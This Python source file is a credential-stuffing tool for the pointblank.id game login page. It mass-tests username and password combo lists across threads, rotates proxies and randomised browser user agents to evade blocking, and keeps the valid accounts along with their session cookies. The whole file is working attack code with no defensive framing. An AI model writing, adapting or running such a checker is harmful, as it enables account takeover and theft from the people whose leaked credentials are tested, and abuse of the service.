import requests
from typing import Dict, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import time

class PointBlankChecker:
    def __init__(self, user_agent: str = None, proxy_list: List[str] = None):
        self.base_url = "https://www.pointblank.id/login/process"
        self.headers = {
            "User-Agent": user_agent or self._get_random_user_agent(),
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.proxy_list = proxy_list
        self.valid_accounts = []
        self.stats = {
            'total': 0,
            'valid': 0,
            'invalid': 0,
            'errors': 0,
            'checked': 0,
            'speed': 0
        }
        self.start_time = 0
        self.running = False

    def _get_random_user_agent(self):
        chrome_versions = [
            "120.0.0.0", "119.0.6045.159", "118.0.5993.88",
            "117.0.5938.92", "116.0.5845.110", "115.0.5790.170"
        ]
        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(chrome_versions)} Safari/537.36"

    def _get_proxy(self):
        if not self.proxy_list:
            return None
        proxy = random.choice(self.proxy_list)
        return {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }

    def check_account(self, username: str, password: str) -> Tuple[bool, Dict]:
        payload = {
            "loginFail": "0",
            "userid": username,
            "password": password
        }
        
        proxy = self._get_proxy()
        
        try:
            response = requests.post(
                self.base_url,
                data=payload,
                headers=self.headers,
                proxies=proxy,
                timeout=15,
                verify=True
            )
            
            if "Data login yang anda masukan tidak sesuai." in response.text:
                return False, {
                    "status": "invalid",
                    "message": "Invalid credentials",
                    "username": username,
                    "password": password,
                    "proxy": proxy
                }
            elif "LOGOUT" in response.text:
                return True, {
                    "status": "valid",
                    "message": "Login successful",
                    "username": username,
                    "password": password,
                    "proxy": proxy,
                    "cookies": response.cookies
                }
            else:
                return False, {
                    "status": "error",
                    "message": "Unknown response",
                    "username": username,
                    "password": password,
                    "proxy": proxy
                }
                
        except requests.exceptions.RequestException as e:
            return False, {
                "status": "error",
                "message": str(e),
                "username": username,
                "password": password,
                "proxy": proxy
            }

    def mass_check(self, combo_list: List[Tuple[str, str]], threads: int = 10):
        self.stats = {
            'total': len(combo_list),
            'valid': 0,
            'invalid': 0,
            'errors': 0,
            'checked': 0,
            'speed': 0
        }
        self.valid_accounts = []
        self.start_time = time.time()
        self.running = True
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(self.check_account, user, pwd): (user, pwd)
                for user, pwd in combo_list
            }
            
            for future in as_completed(futures):
                user, pwd = futures[future]
                try:
                    success, result = future.result()
                    self.stats['checked'] += 1
                    
                    elapsed = time.time() - self.start_time
                    self.stats['speed'] = self.stats['checked'] / elapsed if elapsed > 0 else 0
                    
                    if success:
                        self.stats['valid'] += 1
                        self.valid_accounts.append(result)
                    else:
                        if result['status'] == 'invalid':
                            self.stats['invalid'] += 1
                        else:
                            self.stats['errors'] += 1
                            
                except Exception as e:
                    self.stats['errors'] += 1
                    
        self.running = False